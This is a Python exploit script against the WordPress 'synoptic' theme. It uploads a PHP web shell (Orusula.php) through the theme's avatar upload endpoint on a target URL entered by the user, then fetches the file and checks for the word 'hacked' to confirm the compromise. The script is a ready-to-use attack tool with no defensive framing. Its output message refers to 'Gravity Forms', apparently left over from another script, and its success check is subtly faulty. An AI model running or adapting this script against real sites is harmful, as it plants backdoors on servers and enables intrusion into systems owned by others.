import requests
import re

def synoptic():
    s = requests.session()
    payload = {
        'qqfile':open('../shells/Orusula.php', 'rb')
    }
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
    }

    target = input("[*] enter target url: ")

    ep = target + "wp-content/themes/synoptic/lib/avatarupload/upload.php"

    exploit = s.post(ep, headers=headers, files=payload)

    exploit = exploit.text
    
    exp = target + "wp-content/uploads/markets/avatars/Orusula.php"

    check = s.get(exp, headers=headers)

    text = check.text

    if "Orusula" and "hacked" in text:

        print("[+] Gravity Forms {}".format(exp))
    else:
        print("[-] Gravity Forms")

synoptic()